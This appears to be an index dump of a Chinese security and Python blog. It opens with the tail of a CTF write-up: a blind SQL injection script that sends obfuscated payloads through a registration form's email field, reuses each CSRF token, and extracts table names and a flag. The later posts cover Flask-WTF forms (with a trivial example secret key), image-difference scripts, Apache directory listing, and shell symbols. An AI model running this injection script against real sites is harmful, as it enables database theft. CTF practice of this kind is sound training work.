&quot;(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())&quot;columns = &quot;(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)&quot;data = &quot;(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)&quot;for i in range(1,100): for j in range(32,127): payload = &quot;test&#x27;/**/or/**/ascii(substr(&quot;+ data +&quot;,%d,1))=%d#/**/@chybeta.com&quot; % (i,j) post_data = &#123; &#x27;csrf_token&#x27;: token, &#x27;username&#x27;: &#x27;a&#x27;, &#x27;email&#x27;:payload, &#x27;password&#x27;:&#x27;a&#x27;, &#x27;password2&#x27;:&#x27;a&#x27;, &#x27;submit&#x27;:&#x27;Register&#x27; &#125; r = requests.post(url,data=post_data) soup = BeautifulSoup(r.text,&quot;html5lib&quot;) token = soup.find_all(id=&#x27;csrf_token&#x27;)[0].get(&quot;value&quot;) if notice in r.text: result += chr(j) print result break"},{"title":"WTForms_flask-Form表单验证","date":"2020-03-29","updated":"2024-03-19","path":"2020/03/29/WTForms-flask-Form表单验证/","text":"flask-form文档 Form表单是Web应用中最基础的一部分。为了能处理Form表单，Flask-WTF扩展提供了良好的支持。 0x00 快速回忆 首先在模板html里面定义form的使用,例如: 123456&lt;form method=&quot;POST&quot;&gt; &lt;!--启动CSRF--&gt; &#123;&#123;form.hidden_tag()&#125;&#125; &lt;p&gt; 用户：&#123;&#123;form.name(size=20,id=&#x27;name&#x27;)&#125;&#125; &#123;%for e in form.name.errors%&#125; 然后定义一个表单类,继承与Form类: 12345678#登录表单类,继承与Form类class BaseLogin(Form): #用户名 name=StringField(&#x27;name&#x27;,validators=[DataRequired(message=u&quot;用户名不能为空&quot;) ,Length(10,20,message=u&#x27;长度位于10~20之间&#x27;)],render_kw=&#123;&#x27;placeholder&#x27;:u&#x27;输入用户名&#x27;&#125;) #密码 password=PasswordField(&#x27;password&#x27;,validators=[DataRequired(message=u&quot;密码不能为空&quot;) ,Length(10,20,message=u&#x27;长度位于10~20之间&#x27;)],render_kw=&#123;&#x27;placeholder&#x27;:u&#x27;输入密码&#x27;&#125;) 然后在处理模板的函数中(如route.py),将相应html中的form赋值成我们定义的表单类 1234567#定义处理函数和路由规则，接收GET和POST请求@app.route(&#x27;/baselogin&#x27;,methods=(&#x27;POST&#x27;,&#x27;GET&#x27;))def baselogin(): form=BaseLogin() #判断是否是验证提交 if form.validate_on_submit(): #跳转 我们从页面输入的数据就会通过路由中的设置经过表单类的验证 0x01 安装 1pip install flask-wtf 0x02 开启CSRF保护 Flask-WTF提供了对所有Form表单免受跨站请求伪造（Cross-Site Request Forgery，CSRF）攻击的技术支持（通过添加动态token令牌的方式，关于CSRF可以自行在网上搜索相关内容，以后有时间可能会撰写相关内容）。 考虑到Flask扩展需要大量的配置信息，从这里开始，我们在在Flask根目录下新增config.py的配置文件： 启动CSRF保护，可以在config.py中定义2个变量： 12CSRF_ENABLED = TrueSECRET_KEY = &#x27;123456&#x27; 其中SECRET_KEY用来建立加密的令牌，用于验证Form表单提交，在自己编写应用程序时，可以尽可能设置复杂一些，这样恶意攻击者将很难猜到密钥值。在__init__.py文件中添加如下代码： 1app.config.from_object(&#x27;config&#x27;) 此时完整的__init__.py文件内容如下： 12345678910111213141516#!flask/bin/env python#coding:utf-8 __author__ = &#x27;kikay&#x27; from flask import Flaskfrom flask.ext.bootstrap import Bootstrap #定义app对象app=Flask(__name__)#定义Bootstrap对象bootstrap=Bootstrap(app)#启动配置文件app.config.from_object(&#x27;config&#x27;) from app import views 最后，我们需要在响应的html模板的Form表单中加上如下语句： 1&#123;&#123;form.csrf_token&#125;&#125; 或者： 1&#123;&#123;form.hidden_tag()&#125;&#125; 其中的form是views.py中对应处理函数传递过来的Form对象名称，根据具体情况会有所变化。通过上面的配置，我们就启动了CSRF保护。 0x03 WTF表单 下面看一个简单的登录表单： （1）通常我们会把一个表单里面的元素定义为1个类。下面我们在app包下新建forms.py文件，专门用于定义表单的类： 1234567891011121314151617181920#!flask/bin/env python#coding:utf-8 #引入Form基类from flask.ext.wtf import Form#引入Form元素父类from wtforms import StringField,PasswordField#引入Form验证父类from wtforms.validators import DataRequired,Length __author__ = &#x27;kikay&#x27; #登录表单类,继承与Form类class BaseLogin(Form): #用户名 name=StringField(&#x27;name&#x27;,validators=[DataRequired(message=u&quot;用户名不能为空&quot;) ,Length(10,20,message=u&#x27;长度位于10~20之间&#x27;)],render_kw=&#123;&#x27;placeholder&#x27;:u&#x27;输入用户名&#x27;&#125;) #密码 password=PasswordField(&#x27;password&#x27;,validators=[DataRequired(message=u&quot;密码不能为空&quot;) ,Length(10,20,message=u&#x27;长度位于10~20之间&#x27;)],render_kw=&#123;&#x27;placeholder&#x27;:u&#x27;输入密码&#x27;&#125;) （2）模板baselogin.html: 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;style&gt; .base_login&#123; float: none; display: block; margin-left: auto; margin-right:auto; width: 200px; &#125; &lt;/style&gt; &lt;title&gt;BaseLogin&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;base_login&quot;&gt; &lt;h1&gt;用户登录&lt;/h1&gt; &lt;div&gt; &lt;form method=&quot;POST&quot;&gt; &lt;!--启动CSRF--&gt; &#123;&#123;form.hidden_tag()&#125;&#125; &lt;p&gt; 用户：&#123;&#123;form.name(size=20,id=&#x27;name&#x27;)&#125;&#125; &#123;%for e in form.name.errors%&#125; &lt;span style=&quot;color: red&quot;&gt;*&#123;&#123;e&#125;&#125;&lt;/span&gt; &#123;%endfor%&#125; &lt;/p&gt; &lt;p&gt; 密码：&#123;&#123;form.password(size=20,id=&#x27;password&#x27;)&#125;&#125; &#123;%for e in form.password.errors%&#125; &lt;span style=&quot;color: red&quot;&gt;*&#123;&#123;e&#125;&#125;&lt;/span&gt; &#123;%endfor%&#125; &lt;/p&gt; &lt;p&gt;&lt;button style=&quot;float: right&quot; type=&quot;submit&quot;&gt;登录&lt;/button&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; （3）views.py新增以下代码： 1234567891011121314151617181920from flask import url_for#导入定义的BaseLoginfrom app.forms import BaseLogin #定义处理函数和路由规则，接收GET和POST请求@app.route(&#x27;/baselogin&#x27;,methods=(&#x27;POST&#x27;,&#x27;GET&#x27;))def baselogin(): form=BaseLogin() #判断是否是验证提交 if form.validate_on_submit(): #跳转 flash(form.name.data+&#x27;|&#x27;+form.password.data) return redirect(url_for(&#x27;success&#x27;)) else: #渲染 return render_template(&#x27;baselogin.html&#x27;,form=form) @app.route(&#x27;/success&#x27;)def success(): return &#x27;&lt;h1&gt;Success&lt;/h1&gt;&#x27; 效果如下： 看下源代码： 红色框中就是生成的CSRF保护的token令牌值。如果填入不能通过验证的值，比如admin/admin，将显示警告信息： 如果输入admin12345678/admin12345678将发生跳转： 前面已经实现了一个基础的表单，一些基本元素也涉及到了，还可以使用 Bootstrap 中预先定义好的表单样式渲染整个 Flask-WTF 表单： 123456789101112&#123;%extends &#x27;bootstrap/base.html&#x27;%&#125;&#123;%import &#x27;bootstrap/wtf.html&#x27; as wtf%&#125;&#123;%block content%&#125;&lt;div class=&quot;container col-lg-3 col-lg-offset-3&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h3&gt;WTF-Login&lt;/h3&gt; &lt;/div&gt; &lt;div&gt; &#123;&#123;wtf.quick_form(form)&#125;&#125; &lt;/div&gt;&lt;/div&gt;&#123;%endblock%&#125; 其他部分的修改很简单，就不多讲。 0x04 Flash消息 在表单上面显示一个消息,提示用户用户名或密码错误。 12345678910111213@app.route(&#x27;/baselogin2&#x27;, methods=(&#x27;POST&#x27;, &#x27;GET&#x27;))def baselogin2(): form = BaseLogin() # 判断是否是验证提交 if form.validate_on_submit(): username = form.name.data if username == &#x27;admin&#x27;: return redirect(url_for(&#x27;success&#x27;)) else: # 渲染表单 flash(u&#x27;用户名不正确&#x27;) # 渲染 return render_template(&#x27;mtflogin.html&#x27;, form=form) 模板： 123456789101112131415161718&#123;%extends &#x27;bootstrap/base.html&#x27;%&#125;&#123;%import &#x27;bootstrap/wtf.html&#x27; as wtf%&#125;&#123;%block content%&#125;&lt;div class=&quot;container col-lg-3 col-lg-offset-3&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h3&gt;WTF-Login&lt;/h3&gt; &lt;/div&gt; &lt;div&gt; &#123;%for message in get_flashed_messages()%&#125; &lt;div class=&quot;alert alert-warning&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;&amp;times;&lt;/button&gt; &#123;&#123;message&#125;&#125; &lt;/div&gt; &#123;%endfor%&#125; &#123;&#123;wtf.quick_form(form)&#125;&#125; &lt;/div&gt;&lt;/div&gt;&#123;%endblock%&#125; 效果： 0x05会话保持 利用session机制完成会话保持： 12345678910111213@app.route(&#x27;/baselogin2&#x27;, methods=(&#x27;POST&#x27;, &#x27;GET&#x27;))def baselogin2(): form = BaseLogin() # 判断是否是验证提交 if form.validate_on_submit(): name=session.get(&#x27;name&#x27;) if name is None and name!=form.name.data: flash(u&#x27;您已经切换了用户&#x27;) return redirect(url_for(&#x27;success&#x27;)) elif name==None: session[&#x27;name&#x27;]=form.name.data # 渲染 return render_template(&#x27;mtflogin.html&#x27;, form=form) 0x06自定义验证器 开始做一个可复用的验证器，简单的namefield验证器 123456class MyForm(Form): name = StringField(&#x27;Name&#x27;, [InputRequired()]) def validate_name(form, field): if len(field.data) &gt; 50: raise ValidationError(&#x27;Name must be less than 50 characters&#x27;) 我们可以将函数放在类中，也可以将函数放在类外任何可以调用到函数的地方，如下： 123456def my_length_check(form, field): if len(field.data) &gt; 50: raise ValidationError(&#x27;Field must be less than 50 characters&#x27;) class MyForm(Form): name = StringField(&#x27;Name&#x27;, [InputRequired(), my_length_check]) 我们也可以通过创建一个工厂来让验证器更强大 12345678910def length(min=-1, max=-1): message = &#x27;Must be between %d and %d characters long.&#x27; % (min, max) def _length(form, field): l = field.data and len(field.data) or 0 if l &lt; min or max != -1 and l &gt; max: raise ValidationError(message) return _lengthclass MyForm(Form): name = StringField(&#x27;Name&#x27;, [InputRequired(), length(max=50)]) 现在我们创建了一个可控制长度的字符串长度验证器，下面我们将验证器做的可复用性更高，并且让用户可以自定义自己的错误消息： 1234567891011121314class Length(object): def __init__(self, min=-1, max=-1, message=None): self.min = min self.max = max if not message: message = u&#x27;Field must be between %i and %icharacters long.&#x27; % (min, max) self.message = message def __call__(self, form, field): l = field.data and len(field.data) or 0 if l &lt; self.min or self.max != -1 and l &gt; self.max: raise ValidationError(self.message)length = Length https://blog.csdn.net/qq_35562816/article/details/80002315"},{"title":"图片找不同","date":"2020-03-29","updated":"2024-03-19","path":"2020/03/29/图片找不同/","text":"0x01 今天同学突然给我发了个图片,找不同 这么复杂的图片突然萌生出一种想法,python图像识别领域这么强大,何不用python来实现一下自动寻找呢. 原图: 这里主要是涉及到模式匹配 0x02 思路 读取图片size,然后将图片均分为上下两部分 将下部分图片颠倒后和上部分图片比较,找出不同的地方 将不同的地方标注出来 但是经过操作后发现,原图上下并不是均分的…, 存在上下方向上的图像偏移.所以这个方法行不通 这就需要找到上下两部分图片真正重合的位置了 读取图片size,然后将图片均分为上下两部分 提取上部分图像中的一小块,用于在下部分图像中定位 在下部分图像中搜索出和这一小块图像一样的地方,记录下相应坐标 利用这个坐标做相应的计算,裁剪出真正可用做对比的图像 对比最终裁剪的图像 将不同的地方标注出来 裁剪方式为: 分别从相同点出发,向四周裁剪同样的距离(由于这个图片左右方向没有平移,所以向左右两侧裁剪的宽度就可以是原图宽度) 0x03 实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182# author : Lyc 2020-3-29from PIL import Imagefrom PIL import ImageChops import signalimport numpy as npimport mathimport cv2 as cvfrom skimage.measure import compare_ssimimport argparseimport imutils# 原图尺寸high=0width=0# 用于裁剪小图 对齐位置rawy=200rawx=200# 上部分样本图片右下角在下部分中的位置 由于从一张图片切割 所以图片没有平移现象,不用考虑x轴anchor_y=0# 用于最终上下部分截取图片范围down_y1=0down_y2=0up_y1=0up_y2=0# 最终截取范围 , 以锚点为中心向周围截取多少部分m=160 # 向中心h=200 # 向两侧def picture_cut(): &#x27;&#x27;&#x27; 进行图片上下裁剪,并截取上部分中的一个样本 &#x27;&#x27;&#x27; global width global high img = Image.open(&quot;./raw.jpg&quot;) print(img.size) width = img.size[0] high = img.size[1] # 获取尺寸 cropped_up = img.crop((0, 0, width, high/2)) # 裁剪上部分 (left, upper, right, lower) cropped_down = img.crop((0,high/2,width,high)) # 裁剪下部分图像 matrix=np.array(cropped_down) img_down=Image.fromarray(matrix) cropped_down=img_down.transpose(Image.FLIP_TOP_BOTTOM) # 将下部分图像颠倒 cropped_tem = img.crop((100,100,rawx,rawy)) # 取上部分一块样本 用作定位 cropped_up.save(&quot;./cut_up.jpg&quot;) cropped_down.save(&quot;./cut_down.jpg&quot;) cropped_tem.save(&quot;./tmp.jpg&quot;) def template_demo(): &#x27;&#x27;&#x27; 图片匹配,大图找小图 @target 原图 @tpl 小图 &#x27;&#x27;&#x27; global anchor_y tpl =cv.imread(&quot;./tmp.jpg&quot;) target = cv.imread(&quot;./cut_down.jpg&quot;) #cv.namedWindow(&#x27;template image&#x27;, cv.WINDOW_NORMAL) #cv.imshow(&quot;template image&quot;, tpl) #cv.namedWindow(&#x27;target image&#x27;, cv.WINDOW_NORMAL) #cv.imshow(&quot;target image&quot;, target) methods = [cv.TM_SQDIFF_NORMED, cv.TM_CCORR_NORMED, cv.TM_CCOEFF_NORMED] #3种模板匹配方法 #获得模板图片的高宽尺寸 th, tw = tpl.shape[:2] for md in methods: print(md) result = cv.matchTemplate(target, tpl, md) #寻找矩阵（一维数组当做向量，用Mat定义）中的最大值和最小值的匹配结果及其位置 min_val, max_val, min_loc, max_loc = cv.minMaxLoc(result) if md == cv.TM_SQDIFF_NORMED: tl = min_loc else: tl = max_loc br = (tl[0]+tw, tl[1]+th) #br是矩形右下角的点的坐标 anchor_y=tl[1]+th # 图片下部分锚点 print(&quot;小图右下角在原图中的的坐标&#123;&#125;&quot;.format(br)) #cv.rectangle(target, tl, br, (0, 0, 255), 2) #cv.namedWindow(&quot;match-&quot; + np.str(md), cv.WINDOW_NORMAL) #cv.imshow(&quot;match-&quot; + np.str(md), target) # 显示对比图片def final_cut(up_y1,up_y2,down_y1,down_y2): &#x27;&#x27;&#x27; 裁剪最终可以用来对比的图像 &#x27;&#x27;&#x27; img = Image.open(&quot;./raw.jpg&quot;) print(&quot;final&quot;) cropped_up = img.crop((0, up_y1, width, up_y2)) # 裁剪上部分 (left, upper, right, lower) cropped_down = img.crop((0,down_y1,width,down_y2)) # 裁剪下部分图像 matrix=np.array(cropped_down) img_down=Image.fromarray(matrix) cropped_down=img_down.transpose(Image.FLIP_TOP_BOTTOM) # 将下部分图像颠倒 cropped_up.save(&quot;./cut_final_up.jpg&quot;) cropped_down.save(&quot;./cut_final_down.jpg&quot;)def compare_images(path_one, path_two, diff_save_location): &quot;&quot;&quot; 比较图片，如果有不同则生成展示不同的图片 @参数一: path_one: 第一张图片的路径 @参数二: path_two: 第二张图片的路径 @参数三: diff_save_location: 不同图的保存路径 &quot;&quot;&quot; image_one = Image.open(path_one) image_two = Image.open(path_two) try: diff = ImageChops.difference(image_one, image_two) if diff.getbbox() is None: # 图片间没有任何不同则直接退出 print(&quot;【+】We are the same!&quot;) else: diff.save(diff_save_location) except ValueError as e: text = (&quot;表示图片大小和box对应的宽度不一致，参考API说明：Pastes another image into this image.&quot; &quot;The box argument is either a 2-tuple giving the upper left corner, a 4-tuple defining the left, upper, &quot; &quot;right, and lower pixel coordinate, or None (same as (0, 0)). If a 4-tuple is given, the size of the pasted &quot; &quot;image must match the size of the region.使用2纬的box避免上述问题&quot;) print(&quot;【&#123;0&#125;】&#123;1&#125;&quot;.format(e,text))def mark(): &#x27;&#x27;&#x27; 标注出图片的不同处 &#x27;&#x27;&#x27; imageA = cv.imread(&quot;./cut_final_down.jpg&quot;) imageB = cv.imread(&quot;./cut_final_up.jpg&quot;) # 加载两张图片并将他们转换为灰度： grayA = cv.cvtColor(imageA,cv.COLOR_BGR2GRAY) grayB = cv.cvtColor(imageB,cv.COLOR_BGR2GRAY) # 计算两个灰度图像之间的结构相似度指数： (score,diff) = compare_ssim(grayA,grayB,full = True) diff = (diff *255).astype(&quot;uint8&quot;) print(&quot;SSIM:&#123;&#125;&quot;.format(score)) # 找到不同点的轮廓以致于我们可以在被标识为“不同”的区域周围放置矩形： thresh = cv.threshold(diff,0,255,cv.THRESH_BINARY_INV | cv.THRESH_OTSU)[1] cnts = cv.findContours(thresh.copy(),cv.RETR_EXTERNAL,cv.CHAIN_APPROX_SIMPLE) #cnts = cnts[0] if imutils.is_cv2() else cnts[1] cnts = imutils.grab_contours(cnts) # 找到一系列区域，在区域周围放置矩形： for c in cnts: (x,y,w,h) = cv.boundingRect(c) cv.rectangle(imageA,(x,y),(x+w,y+h),(0,0,255),2) cv.rectangle(imageB,(x,y),(x+w,y+h),(0,0,255),2) # 用cv2.imshow 展现最终对比之后的图片， cv2.imwrite 保存最终的结果图片 cv.imshow(&quot;Modified&quot;,imageB) cv.imwrite(&quot;final.png&quot;,imageB) cv.waitKey(0) if __name__ == &#x27;__main__&#x27;: picture_cut() #裁剪图片 template_demo() print(&quot;在图片窗口按任意键退出&quot;) #cv.waitKey(0) #cv.destroyAllWindows() up_y1=rawx-h up_y2=rawy+m print(&quot;high: &#123;&#125; anchor_y: &#123;&#125; &quot;.format(high,anchor_y)) down_y1=high-anchor_y-m down_y2=high-anchor_y+h print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(up_y1,up_y2,down_y1,down_y2)) final_cut(up_y1,up_y2,down_y1,down_y2) # 裁剪最终用来对比的图像 compare_images(&#x27;./cut_final_up.jpg&#x27;, &#x27;./cut_final_down.jpg&#x27;, &#x27;res_diff.jpg&#x27;) # 比较两图的不同 print(&quot;最终对比图片为: res_diff.jpg final.png&quot;) mark() # 标出不同的地方 脚本中用到的库文件下载方式: 1234pip3 install numpypip3 install opencv-pythonpip3 install scikit-imagepip3 install imutils 0x04 效果 这些小点点还没有去除,可能与选取的阈值,图片噪声有关,但是比较大的方块圈出来的,都是可以人眼分辨出不同的地方,一共有5处 下面这个图可能更好看一些,不同的位置色彩不同"},{"title":"解决pip--upgrade问题","date":"2020-03-29","updated":"2024-03-19","path":"2020/03/29/解决pip-upgrade问题/","text":"python -m pip install --upgrade pip -i https://pypi.douban.com/simple"},{"title":"两张图片找不同","date":"2020-03-28","updated":"2024-03-19","path":"2020/03/28/两张图片找不同/","text":"https://www.cnblogs.com/botoo/p/8416315.html 12345678910111213141516171819202122232425262728293031323334from PIL import Imagefrom PIL import ImageChops def compare_images(path_one, path_two, diff_save_location): &quot;&quot;&quot; 比较图片，如果有不同则生成展示不同的图片 @参数一: path_one: 第一张图片的路径 @参数二: path_two: 第二张图片的路径 @参数三: diff_save_location: 不同图的保存路径 &quot;&quot;&quot; image_one = Image.open(path_one) image_two = Image.open(path_two) try: diff = ImageChops.difference(image_one, image_two) if diff.getbbox() is None: # 图片间没有任何不同则直接退出 print(&quot;【+】We are the same!&quot;) else: diff.save(diff_save_location) except ValueError as e: text = (&quot;表示图片大小和box对应的宽度不一致，参考API说明：Pastes another image into this image.&quot; &quot;The box argument is either a 2-tuple giving the upper left corner, a 4-tuple defining the left, upper, &quot; &quot;right, and lower pixel coordinate, or None (same as (0, 0)). If a 4-tuple is given, the size of the pasted &quot; &quot;image must match the size of the region.使用2纬的box避免上述问题&quot;) print(&quot;【&#123;0&#125;】&#123;1&#125;&quot;.format(e,text)) if __name__ == &#x27;__main__&#x27;: compare_images(&#x27;1.png&#x27;, &#x27;2.png&#x27;, &#x27;我们不一样.png&#x27;)"},{"title":"python图片裁剪","date":"2020-03-28","updated":"2024-03-19","path":"2020/03/28/python图片裁剪/","text":"利用OpenCV进行裁剪 左上角切 123456import cv2 img = cv2.imread(&quot;./diff.jpg&quot;)print(img.shape) # 输出的顺序的是高度、宽度、通道数cropped = img[0:128, 0:512] # 裁剪坐标为[x0:x1,y0:y1]cv2.imwrite(&quot;./diff_cut.jpg&quot;, cropped) 左下角切 123456import cv2 img = cv2.imread(&quot;./diff.jpg&quot;)print(img.shape) # 输出的顺序的是高度、宽度、通道数cropped = img[-128:-1, 0:512] # 裁剪坐标为[x0:x1,y0:y1]cv2.imwrite(&quot;./diff_cut.jpg&quot;, cropped) 使用Pillow进行裁剪 123456from PIL import Image img = Image.open(&quot;./diff.jpg&quot;)print(img.size)cropped = img.crop((0, 0, 400, 128)) # (left, upper, right, lower)cropped.save(&quot;./diff_cut.jpg&quot;)"},{"title":"Apache设置目录访问控制","date":"2020-03-28","updated":"2024-03-19","path":"2020/03/28/Apache设置目录访问控制/","text":"如何修改目录的配置以禁止显示 Apache 目录列表。 缺省情况下如果你在浏览器输入地址：http://localhost:8080/ 如果你的文件根目录里有 index.html，浏览器就会显示 index.html的内容，如果没有 index.html，浏览器就会显示文件根目录的目录列表，目录列表包括文件根目录下的文件和子目录。 同样你输入一个虚拟目录的地址：http://localhost:8080/b/ 如果该虚拟目录下没有 index.html，浏览器也会显示该虚拟目录的目录结构，列出该虚拟目录下的文件和子目录。 如何禁止 Apache 显示目录列表呢？ 方法一 要禁止 Apache 显示目录结构列表，只需将 Option 中的 Indexes 去掉即可。 比如我们看看一个目录的目录配置： 123456&lt;Directory &quot;D:/Apa/blabla&quot;&gt; Options Indexes FollowSymLinks #----------&gt;Options FollowSymLinks AllowOverride None Order allow,deny Allow from all&lt;/Directory&gt; 你只需要将上面代码中的 Indexes 去掉，就可以禁止 Apache 显示该目录结构。用户就不会看到该目录下的文件和子目录列表了。 Indexes 的作用就是当该目录下没有 index.html 文件时，就显示目录结构，去掉 Indexes，Apache 就不会显示该目录的列表了。 方法二 如果是在虚拟主机中，只要增加如下信息就行： 123456&lt;Directory “D:test”&gt; Options -Indexes FollowSymLinks AllowOverride None Order deny,allow Allow from all&lt;/Directory&gt; ​ 这样的话就禁止在test工程下进行目录浏览。 ​ 这样的话就禁止在test工程下进行目录浏览。 备注： 切记莫把“Allow from all”改成 “Deny from all”，否则，整个网站都不能被打开。 方法三(不推荐) 可以在根目录的 .htaccess 文件中输入 123&lt;Files *&gt;Options -Indexes&lt;/Files&gt; 就可以阻止Apache 将目录结构列表出来。 例子 1.apache2.2控制目录文件访问需求 红框可以访问，其他不能访问 2.apache2.2具体正则配置 123456789101112&lt;locationMatch ^/f/user/Panorama/81/581/(group|scene_sound|fishyes|sphere) &gt;order allow,denyallow from all&lt;/locationmMatch&gt; &lt;locationMatch ^/f/user/Panorama/81/581/*\\.preview_\\.jpg$ &gt;order allow,denyallow from all&lt;/locationmMatch&gt;&lt;locationMatch ^/f/user/Panorama/81/581/ &gt;order allow,denydeny from all&lt;/locationMatch&gt; http://blog.sina.com.cn/s/blog_a03d702f0101133h.html https://www.cnblogs.com/init-007/p/11358756.html https://www.cnblogs.com/zhanmeiliang/p/6394193.html"},{"title":"CORS与jsonp","date":"2020-03-27","updated":"2024-03-19","path":"2020/03/27/CORS与jsonp/","text":"https://juejin.im/post/5cb5c40ff265da03a158210e"},{"title":"shell的展开","date":"2020-03-26","updated":"2024-03-19","path":"2020/03/26/shell的展开/","text":"生成错误,服了"},{"title":"whim","date":"2020-03-26","updated":"2024-03-19","path":"2020/03/26/whim/","text":"34C3 CTF https://ctftime.org/event/544/tasks/"},{"title":"Linux-Shell特殊字符汇总","date":"2020-03-26","updated":"2024-03-19","path":"2020/03/26/Linux-Shell特殊字符汇总/","text":"Shell符号及各种解释对照表： Shell符号 使用方法及说明 # 注释符号(Hashmark[Comments]) 1.在shell文件的行首，作为include标记，#!/bin/bash; 2. 其他地方作为注释使用，在一行中，#后面的内容并不会被执行，除非； 3. 但是用单/双引号包围时，#作为#号字符本身，不具有注释作用。 ; 作为多语句的分隔符(Command separator [semicolon])。多个语句要放在同一行的时候，可以使用分号分隔。注意，有时候分号需要转义。 ;; 连续分号(Terminator [double semicolon])。在使用case选项的时候，作为每个选项的终结符。在Bash version 4+ 的时候，还可以使用[;;&amp;], [;&amp;] . 点号(dot command [period])。 1. 相当于bash内建命令source，如： code#!/bin/bash``. data-``file``#包含data-file; 2. 作为文件名的一部分，在文件名的开头，表示该文件为隐藏文件，ls一般不显示出来（ls -a 可以显示）； 3. 作为目录名，一个点代表当前目录，两个点号代表上层目录（当前目录的父目录）。注意，两个以上的点不出现，除非你用引号（单/双）包围作为点号字符本身； 4. 正则表达式中，点号表示任意一个字符。 &quot; 双引号（partial quoting [double quote]）。部分引用。双引号包围的内容可以允许变量扩展，也允许转义字符的存在。如果字符串内出现双引号本身，需要转义，因此不一定双引号是成对的。 ’ 单引号(full quoting [single quote])。单引号括住的内容，被视为单一字符串，引号内的禁止变量扩展，所有字符均作为字符本身处理（除单引号本身之外），单引号必须成对出现。 , 逗号(comma operator [comma])。 1. 用在连接一连串的数学表达式中，这串数学表达式均被求值，但只有最后一个求值结果被返回。如： code#!/bin/bash``let t1=((a=5+1, b=7+2))``echo t1=$t1, a=$a, b=$b``## 这个$t1=$b； 2. 用于参数替代中，表示首字母小写，如果是两个逗号，则表示全部小写，注意，这个特性在bash version 4的时候被添加的。例子： codea=``&quot;ATest&quot;``echo $&#123;a,&#125;``echo $&#123;a,,&#125;``## 前面输出aTest，后面输出的是atest。 \\ 反斜线，反斜杆(escape [backslash])。 1. 放在特殊符号之前，转义特殊符号的作用，仅表示特殊符号本身，这在字符串中常用； 2. 放在一行指令的最末端，表示紧接着的回车无效（其实也就是转义了Enter），后继新行的输入仍然作为当前指令的一部分。 / 斜线，斜杆（Filename path separator [forward slash]）。 1.作为路径的分隔符，路径中仅有一个斜杆表示根目录，以斜杆开头的路径表示从根目录开始的路径； 2.在作为运算符的时候，表示除法符号。如： codea=4``/2 ` 反引号，后引号（Command substitution[backquotes])。命令替换。这个引号包围的为命令，可以执行包围的命令，并将执行的结果赋值给变量。如： codea=```dirname '/tmp/x.log'``` ``## 后面dirname返回的结果会赋值给a，``## 注意，此处Mitchell特地使用了反引号和单引号，注意区别。 : 冒号(null command [colon])。空命令，这个命令什么都不做，但是有返回值，返回值为0（即：true）。这个命令的作用非常奇妙。 1. 可做while死循环的条件； 2. 在if分支中作为占位符（即某一分支什么都不做的时候）； 3. 放在必须要有两元操作的地方作为分隔符，如： code: $&#123;username=```whoami```&#125; 4. 在参数替换中为字符串变量赋值，在重定向操作(&gt;)中，把一个文件长度截断为0（:&gt;&gt;这样用的时候，目标存在则什么都不做），这个只能在普通文件中使用，不能在管道，符号链接和其他特殊文件中使用； 5. 甚至你可以用来注释（#后的内容不会被检查，但:后的内容会被检查，如果有语句如果出现语法错误，则会报错）； 6. 你也可以作为域分隔符，比如环境变量$PATH中，或者passwd中，都有冒号的作为域分隔符的存在； 7. 你也可以将冒号作为函数名，不过这个会将冒号的本来意义转变（如果你不小心作为函数名，你可以使用unset -f : 来取消function的定义）。 ! 感叹号（reverse (or negate) [bang],[exclamation mark])。取反一个测试结果或退出状态。 1. 表示反逻辑，比如后面的!=,这个是表示不等于； 2. 表示取反，如：ls a[!0-9] #表示a后面不是紧接一个数字的文件； 3. 在不同的环境里面，感叹号也可以出现在间接变量引用里面； 4. 在命令行中，可以用于历史命令机制的调用，你可以试试!$,!#，或者!-3看看，不过要注意，这点特性不能在脚本文件里面使用（被禁用）。 * 星号（wildcard/arithmetic operator[asterisk])。 1. 作为匹配文件名扩展的一个通配符，能自动匹配给定目录下的每一个文件； 2. 正则表达式中可以作为字符限定符，表示其前面的匹配规则匹配任意次； 3. 算术运算中表示乘法。 ** 双星号(double asterisk)。算术运算中表示求幂运算。 ? 问号（test operator/wildcard[Question mark])。 1. 表示条件测试； 2. 在双括号内表示C风格的三元操作符((condition?true-result:false-result))； 3. 参数替换表达式中用来测试一个变量是否设置了值； 4. 作为通配符，用于匹配文件名扩展特性中，用于匹配单个字符； 5. 正则表达式中，表示匹配其前面规则0次或者1次。 $ 美元符号(Variable substitution[Dollar sign])。前面已经表示过一种意思。 1. 作为变量的前导符，用作变量替换，即引用一个变量的内容，比如：echo $PATH； 2.在正则表达式中被定义为行末（End of line）。 ${} 参数替换(Variable substitution)。请参考具体内容以获得的详细信息。 $‘…’ 引用内容展开，执行单引号内的转义内容（单引号原本是原样引用的），这种方式会将引号内的一个或者多个[]转义后的八进制，十六进制值展开到ASCII或Unicode字符。 $*, $@ 